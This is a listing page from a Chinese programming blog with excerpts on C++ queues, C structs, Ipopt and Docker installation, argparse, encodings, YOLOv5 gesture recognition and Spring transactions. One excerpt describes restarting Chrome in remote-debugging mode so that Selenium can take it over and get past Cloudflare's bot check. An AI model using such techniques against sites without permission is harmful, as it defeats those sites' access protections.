<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4dbde288366a5ca4b83ec5b3e26627f/" rel="bookmark">
			卡码网语言基础课 | 20. 排队取奶茶
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、 队列的基本认识
二、 队列的操作
2.1 引入头文件
2.2 创建队列
2.3 队列的常见操作
三、 解题
通过本次练习，将会学习到以下C++知识点：
队列的基本概念（队头、队尾）和特点（先入先出）入队、出队、获取队头元素和判断队列是否为空等基本操作queue的定义和使用 题目描述：
假设有一家奶茶店，现在有一些人在排队等待取奶茶，同时也有人在取奶茶。 请你设计一个程序模拟这种情况下的奶茶队列管理。
假设每个人取奶茶的时间非常短，可以忽略不计，只需要考虑队列中的操作。 队列操作说明： 1. 当操作为 1 时，表示有人已经取走奶茶，从队列中删除该人的信息。
2. 当操作为 2 时，表示有新人加入排队，将该人的信息加入队列。 在一系列操作之后，你需要回答：下一个取奶茶的人是谁？
输入描述：
第一行有一个整数 n，代表初始队列有 n 个人。 第二行有 n 个字符串，代表当前奶茶队列中的人。 第三行为一个整数 m，代表接下来将会有 m 次操作。 接下来一共有 m 行，代表共有 m 次操作。 如果是操作 1，那么该行只会有一个数字，代表有人取走了奶茶。
如果是操作 2，那么该行有一个数字和一个字符串，第一个数字 2 表示有人加入了奶茶队列，第二个字符串代表新加入的奶茶队列的人。
输出描述：
输出只有一行，为下一个取奶茶的人。 如果已经没有去奶茶的人了，输出“There are no more people in the queue.”。
输入示例： 5 Giselle Winter Aubree Wrenley Royalty 3 1 1 2 Andrew 输出示例： Aubree 一、 队列的基本认识 在队伍的最后一位（也被称为队尾）入队，想要离开队列，需要从队伍的第一位（也被称为队头）出队。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4dbde288366a5ca4b83ec5b3e26627f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b00535e678190ffec337ab59ef76e619/" rel="bookmark">
			编码中单引号与双引号之间的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在编码中，单引号和双引号之间存在一些区别。总体来说，单引号具有更高的执行效率，而双引号可以解析变量和转义字符。具体区别如下：
解析变量：双引号会解析变量，单引号不会。在双引号中插入变量时，变量后面的英文字符或中文字符会被视为一个整体变量。如果想在变量后面添加空格等特殊字符，需要使用大括号将变量括起来。解析转义字符：双引号可以解析所有的转义字符，而单引号只能解析'和\。执行效率：单引号的执行效率比双引号要高。互插性：双引号和单引号可以互相嵌套。例如，双引号中可以包含单引号，而单引号中可以包含变量。HTML输出：双引号当中的字段会经过编辑器解析，然后再当作HTML代码输出，而单引号里面的不进行解析，直接输出。 综上所述，在编程时，如果需要解析变量或转义字符，可以使用双引号；如果追求更高的执行效率或不需要解析变量和转义字符，可以使用单引号。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24b842624660ad07958fd3a3714bc285/" rel="bookmark">
			结构体和链表例题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、初学结构体
题目描述
请用标准数据类型创建结构体，用于描述一个人的信息，结构体包括三个成员，分别为姓名、性别、3门课的成绩
输入要求
输入为三行。第一行输入人的姓名（可能包含空格）；第二行为一个字母，代表性别；第三行为3个整数，表示3门课的成绩。假设输入的数据都是在有效范围内的
输出要求
输出三行，分别对应输入的三行信息，成绩之间用空格间隔，最后一个数据后面也有空格
输入样例
Peter Chen
m
98 78 70
输出样例
Peter Chen
m
98 78 70
代码示例：
#include&lt;stdio.h&gt; typedef struct student { char name[20]; char gender; int score[3]; }STU; int main() { STU s; int i; gets(s.name); scanf("%c",&amp;s.gender); for(i=0;i&lt;3;i++) { scanf("%d",&amp;s.score[i]); } puts(s.name); printf("%c\n",s.gender); for(i=0;i&lt;3;i++) { printf("%d ",s.score[i]); } printf("\n"); return 0; } 2、结构体的嵌套
题目描述
做个简单的结构体嵌套吧。设计结构体，包含学生姓名、性别、出生日期。其中出生日期又包含年、月、日三部分信息。
输入要求
输入学生姓名、性别、出生日期
输出要求
输入学生姓名、性别、出生日期
输入样例
Susan Wang
f
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24b842624660ad07958fd3a3714bc285/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0eafc7b38bd52ee1a07c1a9023c15d6d/" rel="bookmark">
			Ubuntu18.04安装Ipopt-3.12.8流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0、简介 本文主要介绍在Ubuntu18.04中安装Ipopt库的流程，及过程报错的解决方法，已经有很多关于Ipopt安装的博客，但经过我的测试，很多都失效了，经过探索，找到可流畅的安装Ipopt的方法，总结成本篇博客。
Ipopt是一款用来计算大规模非线性优化的开源软件包，这里用来求解MPC。
1、安装Install CPPAD &amp; Fortran sudo apt-get install cppad gfortran 2、下载Ipopt-3.12.8 从官网下载Ipopt-3.12.8
将下载的Ipopt-3.12.8.zip复制到主目录下，并提取至此处(也就是解压)，得到名为ipopt-3.12.8的文件夹
注意：解压得到的名为ipopt-3.12.8的文件夹一定要在主目录下，不然会安装失败，本人就经历过这样的痛苦。
3、分步下载所需的库 下载Blas 双击进入ipopt-3.12.8文件夹，再双击进入ThirdParty，然后在空白处，右键选择在终端打开，然后执行以下命令，等待下载完毕：
cd Blas/ ./get.Blas 下载Lapack 双击进入ipopt-3.12.8文件夹，再双击进入ThirdParty，然后在空白处，右键选择在终端打开，然后执行以下命令，等待下载完毕：
cd Lapack/ ./get.Lapack 下载Mumps 下载这个依赖库的时候会出现连接超时，这样的错误
--2023-11-27 19:30:03-- http://mumps.enseeiht.fr/MUMPS_4.10.0.tar.gz
正在解析主机 mumps.enseeiht.fr (mumps.enseeiht.fr)... 147.127.176.144
正在连接 mumps.enseeiht.fr (mumps.enseeiht.fr)|147.127.176.144|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 读取文件头错误 (连接被对方重设)。
重试中。
出现上面的错误是因为get.Mumps文件中的下载地址失效了
更换地址：双击进入ipopt-3.12.8文件夹，再双击进入ThirdParty，然后再双击进入Mumps，再打开get.Mumps，把第31行的地址更换成以下地址：
$wgetcmd http://graal.ens-lyon.fr/MUMPS/MUMPS_${mumps_ver}.tar.gz 地址更换好之后，开始下载Mumps：
双击进入ipopt-3.12.8文件夹，再双击进入ThirdParty，然后在空白处，右键选择在终端打开，然后执行以下命令，等待下载完毕：
cd Mumps/ ./get.Mumps 下载Metis 双击进入ipopt-3.12.8文件夹，再双击进入ThirdParty，然后在空白处，右键选择在终端打开，然后执行以下命令，等待下载完毕：
cd Metis/ ./get.Metis 这个我在安装的时候没出现什么问题。
4、编译安装 在Ipopt-3.12.8文件夹下，右键选择在终端打开，然后在打开的终端下，依次执行以下4条语句：
mkdir build &amp;&amp; cd build ../configure make -j4 make install 5、将安装文件复制到特定目录 在Ipopt-3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0eafc7b38bd52ee1a07c1a9023c15d6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d7766fb4a3b1d51d21b94d8653938d7/" rel="bookmark">
			C语言运行脚本程序方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意：执行的命令中带有双引号的话，一定要加 '\'进行转义
1.返回执行状态码：
command参数为需要执行的命令 int executeCommand_noreq(char* command) { int returnValue; // 保存命令执行后的返回值 returnValue = system(command); // 调用system()函数执行命令并将返回值保存到returnValue变量中 if (WIFEXITED(returnValue)) { // 判断命令是否正常退出 int exitStatus = WEXITSTATUS(returnValue); // 获取命令的退出状态（返回值） return exitStatus; } else { return -1; } } 2.返回命令执行结果的输出：
command参数为需要执行的命令语句，result为malloc的一段内存串
也可以在本函数中malloc，就需要改一改函数，返回这个result
不管在函数内或外，都记得释放掉该内存
void executeCommand(char* command,char* result) { // char* result = malloc(COMMEND_BUFSIZE); // 分配一块内存来存储结果 memset(result, 0, COMMEND_BUFSIZE); // 初始化为0，以防数据残留 // 执行命令并将标准输出连接到文件流中 FILE* fp = popen(command, "r"); if (!fp) { perror("popen failed"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d7766fb4a3b1d51d21b94d8653938d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b458c3fb057c7b073ff531c2479ef2fe/" rel="bookmark">
			python之parser.add_argument()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 argparse — 命令行选项、参数和子命令解析器 — Python 3.12.0 文档
argparse 模块是 Python 内置的一个用于命令项选项与参数解析的模块，可以让人轻松编写用户友好的命令行接口。通过在程序中定义好我们需要的参数，然后 argparse 将会从 sys.argv 解析出这些参数。argparse 模块还会自动生成帮助和使用手册，并在用户给程序传入无效参数时报出错误信息。
使用 简单代码示例：
import argparse parser = argparse.ArgumentParser(description='What the program does') parser.add_argument('--sparse', action='store_true', default=False, help='GAT with sparse version or not.') parser.add_argument('--seed', type=int, default=72, help='Random seed.') parser.add_argument('-e', '--epochs', type=int, default=10000, help='Number of epochs to train.') args = parser.parse_args() print(args.sparse) print(args.seed) print(args.epochs) 步骤：
创建一个解析器：创建 ArgumentParser() 对象
添加参数：调用 add_argument() 方法添加参数
解析参数：使用 parse_args() 解析添加的参数
测试：
$ python prog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b458c3fb057c7b073ff531c2479ef2fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/964aac2c0a4709489153834bd0d2d9e8/" rel="bookmark">
			Python(五)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.字符编码 #1、软件运行前，软件的代码及其相关数据都是存放于硬盘中的 #2、任何软件的启动都是将数据从硬盘中读入内存，然后cpu从内存中取出指令并执行 #3、软件运行过程中产生的数据最先都是存放于内存中的，若想永久保存软件产生的数据，则需要将数据由内存写入硬盘 1.1阶段一：一家独大 ASCII表的特点： 1、只有英文字符与数字的一一对应关系 2、一个英文字符对应1Bytes，1Bytes=8bit，8bit最多包含256个数字，可以对应256个字符，足够表示所有英文字符 3、采用8位二进制数对应一个英文字符串 1.2阶段二：诸侯割据、天下大乱 # GBK表的特点： 1、只有中文字符、英文字符与数字的一一对应关系 2、一个英文字符对应1Bytes 一个中文字符对应2Bytes 补充说明： 1Bytes=8bit，8bit最多包含256个数字，可以对应256个字符，足够表示所有英文字符 2Bytes=16bit，16bit最多包含65536个数字，可以对应65536个字符，足够表示所有中文字符 1.3阶段三：分久必合 unicode(内存中统一使用Unicode): 1、兼容万国字符，与万国字符都有对应关系 2、采用16位(16bit=2Bytes) 二进制对应一个中文字符串，个别生僻会采用4Bytes、8Bytes 3、老的字符编码都可以转换成Unicode，但是不能通过Unicode互转 1.4 utf-8：unicode transform format-8编码 那为何在内存中不直接使用utf-8呢？ utf-8是针对Unicode的可变长度字符编码：一个英文字符占1Bytes，一个中文字符占3Bytes，生僻字用更多的Bytes存储 unicode更像是一个过渡版本，我们新开发的软件或文件存入硬盘都采用utf-8格式，等过去几十年，所有老编码的文件都淘汰掉之后，会出现一个令人开心的场景，即硬盘里放的都是utf-8格式，此时unicode便可以退出历史舞台，内存里也改用utf-8，天下重新归于统一 2.文本文件存取乱码问题 存乱了，解决办法是，编码格式应该设置成支持文件内字符串的格式
取乱了，解决办法是，文件是以什么编码格式存入硬盘的，就应该以什么编码格式读入
python解释器默认的文件的编码
python3默认：utf-8
python2默认：ASCII
2.1.1保证运行python程序前两个阶段不乱码的核心法则 指定文件头修改默认的编码 在py文件的首行写： # coding utf-8 # coding 文件当初存入硬盘时所采用的编码格式 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73f79e8fb05ee2531f39a899d9f4a20e/" rel="bookmark">
			手势识别2：基于YOLOv5的手势识别系统(含手势识别数据集&#43;训练代码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手势识别2：基于YOLOv5的手势识别系统(含手势识别数据集+训练代码) 目录
手势识别2：基于YOLOv5的手势识别系统(含手势识别数据集+训练代码)
1. 前言
2. 手势识别的方法
（1）基于多目标检测的手势识别方法
（2）基于手部检测+手势分类识别方法
3. 手势识别数据集说明
（1）HaGRID手势识别数据集
（2）自定义数据集
4. 基于YOLOv5的手势识别训练
（1）YOLOv5安装
（2）准备Train和Test数据
（3）配置数据文件
（4）配置模型文件
（5）重新聚类Anchor（可选）
（6）开始训练
（7）可视化训练过程
（8）常见的错误
5. Python版本手势识别测试效果
6. Android版本手势识别
7.项目源码下载
8.项目推荐：手部关键点检测
1. 前言 手势作为一种肢体语言，在人类交流中的使用起着重要作用。一个简单的手势蕴涵着丰富的信息，正因为如此，人与人可以之间通过手势来传达大量的信息，实现高速的通信。将手势运用于计算机，能够很好地改善人机交互的效率。
人类的手势主要分为：
1）交互性手势与操作性手势：前者手的运动表示特定的信息（如乐队指挥），靠视觉来感知，后者不表达任何信息（如弹琴）。
2）自主性手势和非自主性手势：后者与语音配合用来加强或补充某些信息（如演讲者用手势描述动作、空间结构等信息）。
3）离心手势和向心手势：前者直接针对说话人，有明确的交流意图，后者只是反映说话人的情绪和内心的愿望。
手势识别（HGR）作为人机交互的一部分，在汽车领域、家庭自动化系统、各种视频/流媒体平台等领域具有广泛的实际应用。本篇博客，将基于YOLOv5搭建一个手势识别目标检测系统，支持one,two,ok等18种常见的通用手势动作识别，目前基于多目标检测的手势识别方法YOLOv5s的平均精度平均值mAP_0.5=0.99569，mAP_0.5:0.95=0.87605，基本满足业务的性能需求。
另外，为了能部署在手机Android平台，本人对YOLOv5s进行了模型轻量化，开发了一个轻量级的版本，yolov5s05，在普通Android手机上可以达到实时的手势识别效果，CPU(4线程)约30ms左右，GPU约25ms左右 ，基本满足业务的性能需求。
先展示一下Python版本手势识别Demo视频效果：
【源码下载】 基于YOLOv5的手势识别系统(含手势识别数据集+训练代码)
【尊重原创，转载请注明出处】https://blog.csdn.net/guyuealian/article/details/126750433
更多手势识别，手部关键点检测的系列文章请参考：
手势识别1：HaGRID手势识别数据集使用说明和下载手势识别2：基于YOLOv5的手势识别系统(含手势识别数据集+训练代码)手势识别3：Android实现手部检测和手势识别（可实时运行，含Android源码）手势识别4：C/C++实现手部检测和手势识别(含源码下载)手部关键点检测1：手部关键点(手部姿势估计)数据集(含下载链接)手部关键点检测2：YOLOv5实现手部检测(含训练代码和数据集)手部关键点检测3：Pytorch实现手部关键点检测(手部姿势估计)含训练代码和数据集手部关键点检测4：Android实现手部关键点检测(手部姿势估计)含源码 可实时检测手部关键点检测5：C++实现手部关键点检测(手部姿势估计)含源码 可实时检测 ​​
还有更多Android版本的手势识别效果：Android手部检测和手势识别（含训练代码+Android源码+手势识别数据集）
​​​ 2. 手势识别的方法 （1）基于多目标检测的手势识别方法 基于多目标检测的手势识别方法，一步到位，把手势类别直接当成多个目标检测的类别进行训练。
该方案采用one-stage的方法，直接端到端训练，任务简单，速度较快；新增类别或者数据，需要人工拉框标注手势，成本较大需要均衡采集的不同手势类别的样本数部署简单 （2）基于手部检测+手势分类识别方法 该方法，先训练一个通用的手部检测模型(不区分手势，只检测手部框)，然后裁剪手部区域，再训练一个手势分类器，完成对不同手势的分类识别。
该方案采用two-stage方法，可针对性分别提高检测模型和分类模型的性能手部检测模型不区分手势，只检测手部框，检测精度较高，手势分类模型可以做到很轻量手势分类数据比较容易采集（你可以采集一个动手一个视频，这样经过手部检测裁剪下来的图片都是同一个类别的动作，减少人工拉框标注手势的成本）由于采用two-stage方法进行检测-识别，因此速度相对较慢 考虑到HaGRID手势识别数据集，所有图片已经标注了手势类别和检测框，因此采用“基于多目标检测的手势识别方法”更为简单。本篇博客就是基于多目标检测的手势识别方法，多目标检测的的方法较多，比如Faster-RCNN，YOLO系列，SSD等均可以采用，本博客将采用YOLOv5进行多目标检测的手势识别训练。
如果你的数据集仅有部分检测框，但手势分类图片的数据集比较容易采集，建议使用“基于手部检测+手势分类识别方法”，毕竟这方案标注成本比较低。若你需要这个方案，可以微信公众号联系我。
3. 手势识别数据集说明 （1）HaGRID手势识别数据集 原始的HaGRID数据集非常大，图片都是高分辨率（1920 × 1080）200W像素，完整下载HaGRID数据集，至少需要716GB的硬盘空间。另外，由于是外网链接，下载可能经常掉线。
考虑到这些问题，本人对HaGRID数据集进行精简和缩小分辨率，目前整个数据集已经压缩到18GB左右，可以满足手势识别分类和检测的任务需求，为了有别于原始数据集，该数据集称为Light-HaGRID数据集，即一个比较轻量的手势识别数据集。
提供手势动作识别数据集，共18个手势类别，每个类别约含有7000张图片，总共123731张图片(12W+)提供所有图片的json标注格式文件，即原始HaGRID数据集的标注格式提供所有图片的XML标注格式文件，即转换为VOC数据集的格式提供所有手势区域的图片，每个标注框的手部区域都裁剪下来，并保存在Classification文件夹下可用于手势目标检测模型训练可用于手势分类识别模型训练 关于《HaGRID手势识别数据集使用说明和下载》，请参考鄙人另一篇博客，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73f79e8fb05ee2531f39a899d9f4a20e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8356ad4bd043463f265930de641bf698/" rel="bookmark">
			一文教你如何准确判断元素是否在可视区域！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法1：getBoundingClientRect 用法 let domRect = dom.getBoundingClientRect()； DOMRect：{ x/left：视图原点（左上角）距离dom左边框距离， y/top：视图原点（左上角）距离dom上边框距离， right：视图原点（左上角）距离dom右边框距离， bottom：视图原点（左上角）距离dom底边框距离， width：dom的宽度，标准盒模型，width = 宽度+padding+border；怪异盒模型，width = 设置的宽度， height：dom的高度， } 所以我们可以根据DOMRect的中的各个属性来判断dom是否在可视区域内。
eg:
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;getBoundingClientRect可视区域&lt;/title&gt; &lt;style&gt; * { margin: 0 } .circle-wrap { position: fixed; top: 50px; right: 50px; padding: 10px; box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1); width: 140px; background: #fff; } .circle-wrap .circle { display: inline-block; width: 20px; height: 20px; border-radius: 50%; background: red; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8356ad4bd043463f265930de641bf698/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08abf5807abbb60f8976e5fedd4ac4e6/" rel="bookmark">
			Linux CentOS7 安装Docker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CentOS7安装Docker： Docker简介 Docker是一个开源的容器化平台，可帮助开发者轻松地创建、部署和运行应用程序。Docker使开发人员能够在一个独立的容器中打包应用程序及其依赖项，这样他们就可以轻松地将应用程序移植到任何其他环境中。Docker中每个容器都可以看成是一个独立的Linux极简操作系统，容器之间相互独立，互不干扰。
使用Docker的主要优势 1、便于部署：由于Docker容器可以在任何支持Docker的平台上运行，因此应用程序可以轻松地在不同的环境中部署和运行。
2、隔离性：Docker容器提供了隔离的运行环境，使得应用程序可以在独立的环境中运行，从而避免了依赖冲突和其他问题。
3、可移植性：Docker容器可以轻松地从一个平台移植到另一个平台，从而使应用程序在不同的平台上运行变得更加容易。
4、安全性：Docker容器提供了安全性隔离，使得应用程序和它的依赖项可以在受保护的环境中运行，从而减少了潜在的安全风险。
一、安装前必读 在安装 Docker 之前，先说一下配置，我这里是Centos7 Linux 内核：官方建议 3.10 以上，3.8以上貌似也可。
注意：本文的命令使用的是 root 用户登录执行，不是 root 的话所有命令前面要加 sudo
例如：sudo yum -y update
1.查看当前的内核版本
命令：uname -r
2.使用 root 权限更新 yum 包（生产环境中此步操作需慎重，看自己情况，学习的话随便搞）
执行：yum -y update 命令后 得重启下云服务器，很有可能启动不起来。
报错iptables提示unable to initialize table ‘filter’ 解决办法：可以尝试重启服务器，正常启动了
这两个命令可以根据自己的情况来执行（不是必须执行的，如果出现不兼容的情况就必须update）
命令：yum -y update #升级所有包同时也升级软件和系统内核
命令：yum -y upgrade #只升级所有包，不升级软件和系统内核
3.卸载旧版本（如果之前安装过的话）
命令：yum remove docker docker-common docker-selinux docker-engine
二、安装Docker的详细步骤 1.安装需要的软件包， yum-util 提供yum-config-manager功能，另两个是devicemapper驱动依赖
命令：yum install -y yum-utils device-mapper-persistent-data lvm2
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08abf5807abbb60f8976e5fedd4ac4e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15943455475e1fea578b26a68f357d9e/" rel="bookmark">
			R语言学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Part1阶段1：入门基础 1安装R和RStudio： 下载并安装R：https://cran.r-project.org/ 下载并安装RStudio：https://www.rstudio.com/products/rstudio/download/ 2Hello World： 学习如何在R中输出"Hello, World!"。 cat("Hello, World!\n")
print("Hello, World!")
3变量和数据类型： 学习如何创建变量和了解基本的数据类型，如数值、字符、逻辑等。 在R语言中，您可以创建不同类型的变量，并且R会自动识别其数据类型。以下是一些常见的R语言变量类型和数据类型： 数值型（Numeric）： 用于表示数值，包括整数和浮点数。 示例： x &lt;- 5 # 整数
y &lt;- 3.14 # 浮点数
字符型（Character）： 用于表示文本字符串。 示例： name &lt;- "Alice"
逻辑型（Logical）： 用于表示逻辑值，可以是TRUE或FALSE。 示例： is_raining &lt;- TRUE
向量（Vector）： 用于存储一维数据集合，可以包含相同数据类型的元素。 示例： numbers &lt;- c(1, 2, 3, 4, 5)
列表（List）： 用于存储多种不同数据类型的元素。 示例： person &lt;- list(name="Alice", age=30, is_student=TRUE)
数据框架（Data Frame）： 用于存储二维数据，类似于表格，每列可以有不同的数据类型。 示例： data_frame &lt;- data.frame(Name=c("Alice", "Bob", "Charlie"),
Age=c(30, 25, 35),
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15943455475e1fea578b26a68f357d9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/446269ef724123568b236ce6c5af92f0/" rel="bookmark">
			Python优雅重启谷歌游览器并过cf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python如何优雅的重启谷歌游览器？ 代码很简单：
import subprocess homepage = "about:blank" # 结束已经启动的谷歌游览器 subprocess.run("taskkill /f /im chrome.exe", shell=True) # debug启动谷歌游览器 subprocess.run(["start", "chrome", homepage, "--remote-debugging-port=9222"], shell=True) 注意：shell=True是必须的，因为start是命令行的命令。
为什么start命令可以直接启动谷歌？ 经过测试，在命令行中执行"chrome"提示找不到，但执行"start chrome"却能够顺利的启动：
&gt;chrome 'chrome' 不是内部或外部命令，也不是可运行的程序或批处理文件。 &gt;start chrome &gt; 在Windows中直接执行，会在当前目录和环境变量中查找，但是start启动的机制却有所区别，start不仅会在当前目录和环境变量中查找命令，还会在注册表HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\和HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
中查找命令。
之所以start chrome可以直接启动谷歌就是因为注册表\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe的存在，我们也可以通过读取该注册表获取谷歌游览器的位置：
import winreg key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe") chrome_path = winreg.QueryValue(key, "") chrome_path 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' 还可以获取谷歌游览器的两个位置是\HKEY_CLASSES_ROOT\Applications\chrome.exe\shell\open\command的值和HKEY_CLASSES_ROOT\ChromeHTML\Application的ApplicationIcon项，但它们需要对字符串进行额外处理。
如何优雅的过cf？ 方案1： 重启谷歌游览器后，等待一段时间后，再自动化工具接管游览器
from selenium import webdriver import subprocess # from selenium.webdriver.support import expected_conditions as EC # from selenium.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/446269ef724123568b236ce6c5af92f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee553fe8928ed0ed140cad67770bbcb5/" rel="bookmark">
			Spring 面试题——事务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.谈谈对 Spring 事务的理解。2.Spring 管理事务的方式有哪几种？3.✨Spring 事务底层源码是如何实现的？3.1.后置处理3.2.事务执行3.3.总结 4.@Transactional 注解有什么作用？它的常用属性有哪些？5.✨Spring 事务中的传播行为是指什么？具体有哪几种传播行为？6.Spring 中如何设置传播行为？ 1.谈谈对 Spring 事务的理解。 （1）概念：Spring 事务是 Spring 框架提供的一种用于处理数据库事务的机制。在传统的 JDBC 中，我们需要手动管理事务的开启、提交和回滚，这样的代码实现非常繁琐且容易出错，而 Spring 事务通过对事务进行封装，提供了一种更方便、更简单的方式来管理事务。
（2）底层实现原理：Spring 的事务管理是通过 Spring AOP 功能实现的，它在方法调用前后进行事务的管理和控制。以声明式事务管理为例，通过在方法或类上添加 @Transactional 注解，Spring 会在执行方法时自动为其创建事务，并在方法执行完成后根据执行结果决定是否提交或回滚事务。通过使用 Spring AOP 和事务管理，可以实现业务逻辑和横切关注点的松耦合，并实现更可维护和可扩展的代码。
（3）特性：Spring 事务的关键特性以下几点：
多种管理事务的方式：Spring 提供了多种管理事务的方式，例如声明式事务、编程式事务，我们根据实际情况选取对应的方式。多种传播行为：Spring 事务提供了 7 种传播行为，如 REQUIRED（如果没有事务，则创建一个新事务；如果有事务，则加入当前事务）、REQUIRES_NEW（无论是否存在事务，都创建一个新事务）、NESTED（嵌套事务，创建一个保存点，允许内部事务独立提交或回滚）等。这些传播行为可以根据业务需求进行配置，实现对事务的精确控制。隔离级别：Spring 事务支持多种隔离级别，如 READ_UNCOMMITTED（读未提交）、READ_COMMITTED（读已提交）、REPEATABLE_READ（可重复读）、SERIALIZABLE（串行化）等。通过配置隔离级别，我们可以控制事务对于其他事务的可见性和并发行为，确保数据的隔离性。异常处理：Spring 事务提供了异常处理机制，可以配置需要回滚的异常类型和不需要回滚的异常类型。当方法中抛出指定类型的异常时，事务将回滚或不回滚，从而可以对事务执行过程中发生的异常进行精细的管理。 2.Spring 管理事务的方式有哪几种？ Spring 管理事务的方式有以下三种：
编程式事务管理：编程式事务管理是通过在代码中编写事务管理相关的代码实现的。这种方式需要手动控制事务的开启、提交和回滚，代码比较繁琐。在 Spring 中，可以使用 TransactionTemplate 或者直接使用 PlatformTransactionManager 接口的实现类来实现编程式事务管理。声明式事务管理：声明式事务管理是通过在配置文件或者注解@Transactional 中声明事务的相关信息来实现的。这种方式可以将事务的控制从代码中分离出来，使得代码更加简洁。在 Spring 中，可以使用 AOP 技术来实现声明式事务管理，通过在配置文件中配置切面和通知，使得 Spring 在执行方法时自动应用事务管理。 3.✨Spring 事务底层源码是如何实现的？ Spring 事务的源码部分大体上可以分为 2 步：创建目标 Bean 的后置处理和事务执行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee553fe8928ed0ed140cad67770bbcb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7479392030ea762f13b4253335894fa/" rel="bookmark">
			python爬虫-某公开数据网站实例小记
			</a>
